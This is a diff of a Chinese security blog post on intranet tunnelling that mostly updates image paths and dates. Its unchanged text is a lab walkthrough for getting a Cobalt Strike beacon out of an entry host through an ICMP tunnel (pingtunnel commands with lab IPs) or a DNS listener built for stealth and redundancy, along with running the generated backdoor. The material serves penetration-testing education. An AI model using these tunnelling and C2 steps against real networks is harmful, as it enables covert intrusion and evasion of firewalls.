@@ -27,20 +27,20 @@
 <meta property="og:site_name" content="AAAAl&#39;blog">
 <meta property="og:description" content="[TOC] 摘要内网穿透（NAT穿透）是指在无法直接访问内网主机的情况下，通过一定的技术手段，让外部网络能够访问内网中的设备或服务。它常用于远程办公、内网渗透测试、远程维护、搭建内网服务等场景。这篇文章我们会从内网渗透测试的角度来讲解一下内网穿透的利用。（文章大部分是文字，总体比较枯燥，也不是很好理解，建议先看一下b站上小迪渗透中关于内网穿透的讲解视频) 内网穿透为什么需要内网穿透在进行内网渗透时">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://aaaa-l.github.io/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/1.jpg">
-<meta property="og:image" content="https://aaaa-l.github.io/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/4.jpg">
-<meta property="og:image" content="https://aaaa-l.github.io/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/2.jpg">
-<meta property="og:image" content="https://aaaa-l.github.io/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/3.jpg">
-<meta property="og:image" content="https://aaaa-l.github.io/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/5.jpg">
-<meta property="og:image" content="https://aaaa-l.github.io/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/6.jpg">
-<meta property="og:image" content="https://aaaa-l.github.io/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/7.jpg">
+<meta property="og:image" content="https://aaaa-l.github.io/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/1.jpg">
+<meta property="og:image" content="https://aaaa-l.github.io/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/4.jpg">
+<meta property="og:image" content="https://aaaa-l.github.io/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/2.jpg">
+<meta property="og:image" content="https://aaaa-l.github.io/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/3.jpg">
+<meta property="og:image" content="https://aaaa-l.github.io/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/5.jpg">
+<meta property="og:image" content="https://aaaa-l.github.io/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/6.jpg">
+<meta property="og:image" content="https://aaaa-l.github.io/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/7.jpg">
 <meta property="article:published_time" content="2025-08-03T00:46:21.000Z">
-<meta property="article:modified_time" content="2025-08-06T16:31:52.369Z">
+<meta property="article:modified_time" content="2025-11-06T07:04:26.717Z">
 <meta property="article:author" content="AAAAl">
 <meta property="article:tag" content="隧道">
 <meta property="article:tag" content="代理">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://aaaa-l.github.io/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/1.jpg">
+<meta name="twitter:image" content="https://aaaa-l.github.io/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/1.jpg">
   
   
   
@@ -79,7 +79,7 @@
 <div class="widgets">
 
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/07/11/%E6%8F%90%E6%9D%83/"><span class="title">提权</span></a><a class="item title" href="/2025/07/30/Socket%E5%92%8CSOCKS%E4%BB%8B%E7%BB%8D/"><span class="title">Socket和SOCKS介绍</span></a><a class="item title" href="/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"><span class="title">内网穿透</span></a><a class="item title" href="/2025/01/28/php-filter%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/"><span class="title">php://filter协议的妙用</span></a><a class="item title" href="/2025/06/28/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/"><span class="title">临时文件的利用</span></a><a class="item title" href="/2025/06/18/%E5%88%A9%E7%94%A8%E7%BC%93%E5%AD%98%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB/"><span class="title">利用缓存进行攻击</span></a><a class="item title" href="/2025/02/02/python%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/"><span class="title">python中的命令执行函数</span></a><a class="item title" href="/2024/12/30/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E6%97%A0%E5%9B%9E%E6%98%BE/"><span class="title">flask中的ssti注入-无回显</span></a><a class="item title" href="/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/"><span class="title">flask中的ssti注入-绕过</span></a><a class="item title" href="/2024/12/23/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">flask中的ssti注入-前置基础知识</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"><span class="title">内网穿透</span></a><a class="item title" href="/2025/06/28/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/"><span class="title">临时文件的利用</span></a><a class="item title" href="/2025/06/18/%E5%88%A9%E7%94%A8%E7%BC%93%E5%AD%98%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB/"><span class="title">利用缓存进行攻击</span></a><a class="item title" href="/2025/07/30/Socket%E5%92%8CSOCKS%E4%BB%8B%E7%BB%8D/"><span class="title">Socket和SOCKS介绍</span></a><a class="item title" href="/2025/07/11/%E6%8F%90%E6%9D%83/"><span class="title">提权</span></a><a class="item title" href="/2025/01/28/php-filter%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/"><span class="title">php://filter协议的妙用</span></a><a class="item title" href="/2025/02/02/python%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/"><span class="title">python中的命令执行函数</span></a><a class="item title" href="/2024/12/30/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E6%97%A0%E5%9B%9E%E6%98%BE/"><span class="title">flask中的ssti注入-无回显</span></a><a class="item title" href="/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/"><span class="title">flask中的ssti注入-绕过</span></a><a class="item title" href="/2024/12/23/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">flask中的ssti注入-前置基础知识</span></a></div></widget>
 </div>
 <footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/AAAA-l" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"></a></div></footer>
 </div></aside><div class="l_main" id="main">
@@ -92,7 +92,7 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-08-03T00:46:21.000Z">2025-08-03</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-08-06T16:31:52.369Z">2025-08-07</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-08-03T00:46:21.000Z">2025-08-03</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-11-06T07:04:26.717Z">2025-11-06</time></span></div></div></div>
     
   </div>
   </div><article class="md-text content"><p>[TOC]</p>
@@ -156,7 +156,7 @@
 <ol>
 <li>数据封装<br>隧道代理会把原始数据流（如 HTTP、RDP、SSH 等）封装在另一种协议的数据包中（如 TCP、HTTP、HTTPS、SSH、VPN 协议等），使其能够穿越受限网络或防火墙。</li>
 <li>隧道建立<br>客户端与代理服务器之间建立一条“隧道”连接。所有需要转发的数据都通过这条隧道传输，外部网络只看到隧道协议的数据流，而看不到真实内容。</li>
-<li>数据转发<br>  代理服务器接收到封装的数据后，解包还原成原始数据，再转发到目标主机。目标主机的响应同样经过代理服务器封装后返回客户端。</li>
+<li>数据转发<br> 代理服务器接收到封装的数据后，解包还原成原始数据，再转发到目标主机。目标主机的响应同样经过代理服务器封装后返回客户端。</li>
 </ol>
 <p>隧道中根据协议的不同，有 <strong>ICMP、DNS、SMB</strong> 等隧道，包括我们前面提到的 SOCKS 代理也是隧道代理实现的一种，但他会和前面几种区分开来。我们这里简单做个比较：</p>
 <table>
@@ -245,29 +245,36 @@
 <h6 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h6><p>我们这里借助 CS 和 <a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel"><strong>pingtunnel</strong></a> 来演示第二种方式建立 ICMP 隧道并上线到 C2 服务端。我们这里一个是自己真实的 win10 主机充当 CS 客户端，kali 虚拟机 充当 CS 服务端，以及一个 win10 虚拟机充当入口机。这里我们需要分别下载 pingtunnel 的windows 和 linux 版本。其中 windows 版本放在 win10 虚拟机上作为客户端，linux 版本放在kali 虚拟机充当服务端。</p>
 <p>我们先在 kali 上启动 CS 服务端，然后我们本地启动 CS 客户端进行连接。</p>
 <p>之后，我们再在 kali 上启动 pingtunnel 的服务端，运行命令为<code>./pingtunnel -type server  </code>：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/./%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/1.jpg" alt="pingtunnel 服务端"></p>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/1.jpg" class="lazy" title="pingtunnel 服务端">
+
 <p>随后，我们在 win10 虚拟机上一管理员身份运行 pingtunnel 的客户端，命令为<code>pingtunnel -type client -l :6666 -s 192.168.161.128 -t 192.168.161.128:7777 -tcp 1 -noprint 1 -nolog 1</code>，这里是连接服务端，然后监听本地 6666 端口的流量，然后将本地端口的流量转发给服务端的7777端口。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/./%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/4.jpg" alt="pingtunnel 客户端"></p>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/4.jpg" class="lazy" title="pingtunnel 客户端">
+
 <p>然后，我们查看 kali 服务端，可以发现收到了客户端的连接。可以看到<code>ping from 192.168.161.200</code>的信息。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/./%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/2.jpg" alt="连接查看"></p>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/2.jpg" class="lazy" title="连接查看">
+
 <p>我们还需要在本地 CS 的客户端生成两个监听器。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/./%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/3.jpg" alt="监听器"></p>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/3.jpg" class="lazy" title="监听器">
+
 <p>可以看到第一个是连接到本地的 6666 端口，第二个是连接到 192.168.161.128（kali）的 7777 端口。我们使用第一个监听器生成对应的 exe 文件，放到 win10 虚拟机上面运行，因为 pingtunnel 客户端在运行，他就会将监听到的 6666 端口的流量转发到服务端（192.168.161.128）的 7777 端口。又因为我们第二个监听器就是监听的  CS 服务端（192.168.161.128）7777 端口，所以这里成功上线了。</p>
 <p>跟我们前面端口转发那里讲解得一致，这里也是<strong>一个监听器负责生成后门，一个负责进行监听连接</strong>。</p>
 <p>最后，我们通过上线的会话来执行<code>ipconfig</code>命令来查看是否上线的是 win10 虚拟机。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/./%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/5.jpg" alt="验证结果"></p>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/5.jpg" class="lazy" title="验证结果">
+
 <p>可以看到没有问题（192.168.161.200）。</p>
 <p>我们这里如果不需要上线的话，在连接到 pingtunnel 服务端时，我们还需要借助其他工具来实现流量转发。我们需要在 win10 虚拟机建立一个本地 SOCKS 代理（6666端口，将访问到 win10 虚拟机的流量转发到监听的6666端口），因为这里只是对6666端口的流量进行了监听和转发，如果我们访问的不是6666端口，这个时候就接收不到流量；同样，我们需要在 kali 虚拟机上也进行流量的监听和转发，我们这里可以将7777端口的流量转发到8888端口，然后我们本地物理机 win10 再通过 proxifier 设置一个 SOCKS 代理，在我们访问 win10 虚拟机相关资源时，将流量转发到 kali 虚拟机的8888端口。我们这里推荐一个工具来实现上面提到的代理和转发——<a target="_blank" rel="noopener" href="https://github.com/EddieIvan01/iox"><strong>iox</strong></a>。</p>
 <p>这里配置起来还是比较繁琐，有点绕。借助这种方法，我们也可以通过入口机访问其他主机资源，在常规 SOCKS 代理受到了防火墙的限制时。</p>
 <h6 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h6><p>CS 是支持 DNS 协议的监听器的。所以我们这里可以不用借助其他工具或者自己实现监听器。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/./%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/6.jpg" alt="DNS"></p>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/6.jpg" class="lazy" title="DNS">
+
 <ol>
 <li>首先，申请一个域名（如 <a target="_blank" rel="noopener" href="http://www.test.com),并购买一个公网ip./">www.test.com），并购买一个公网IP。</a></li>
 <li>在域名管理后台，将 <a target="_blank" rel="noopener" href="http://www.test.com/">www.test.com</a> 的A记录指向你的公网IP。</li>
 <li>创建一条 NS 记录，将子域名（如 a.test.com）指向 <a target="_blank" rel="noopener" href="http://www.test.com.可以多配置几条/">www.test.com。可以多配置几条</a> NS 记录（如 b.test.com 也指向 <a target="_blank" rel="noopener" href="http://www.test.com),以提升可用性和冗余,防止单一域名失效./">www.test.com），以提升可用性和冗余，防止单一域名失效。</a></li>
 <li>在 Cobalt Strike（CS）中，配置监听器时，使用你已配置的域名（a.test.com、b.test.com）作为监听器的主机名（Host），这样即使某个域名被封，其他域名仍可用，提升隐蔽性和生存能力。</li>
 </ol>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/./%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/7.jpg" alt="DNS"></p>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2025/08/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/7.jpg" class="lazy" title="DNS">
+
 <p>最后，我们生成对应的后面，上传到目标机器并执行，即可实现 C2 上线。</p>
 <p>在上线2之后，我们前面也提到了 DNS 带宽很低，所以回显比较慢，我们这里想要提升速度的话，还需要先后执行两条命令<code>checkin</code>，<code>mode dns-txt</code>。</p>
 <p>如果我们只是单纯想要实现 DNS 隧道的话，那么我们这里可能还需要借助其他工具，这里推荐使用<a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2"><strong>dnscat2</strong></a>，这里就不再演示了。</p>
